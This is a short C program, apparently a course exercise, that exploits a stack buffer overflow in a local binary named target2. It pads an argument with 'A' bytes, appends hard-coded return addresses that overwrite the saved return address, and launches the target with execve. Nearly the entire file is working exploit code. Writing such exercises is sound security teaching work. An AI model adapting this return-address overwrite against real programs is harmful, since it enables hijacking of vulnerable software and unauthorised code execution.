#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/home/kxm180046/targets/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  
  // exp
  //28 bytes required to overwrite eip, plus 1 for the final \0
  args[1] = malloc(33);
  int i;
  for (i = 0; i < 25; i++) {
    //overwrite the string with junk, to make sure there aren't any random 
    //terminators in the string that would stop strcpy()
    args[1][i] = 'A';
  }

  //overwrite the return address
  args[1][24] = '\x68';
  args[1][25] = '\xfe';
  args[1][26] = '\xff';
  args[1][27] = '\xbf';

  args[1][28] = '\x02';
  args[1][29] = '\x85'; 
  args[1][30] = '\x04';
  args[1][31] = '\x08';
  

  args[1][32] = '\0'; //add terminating \0 to the string


  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
  {
    fprintf(stderr, "execve failed.\n");
  }
    

  return 0;
}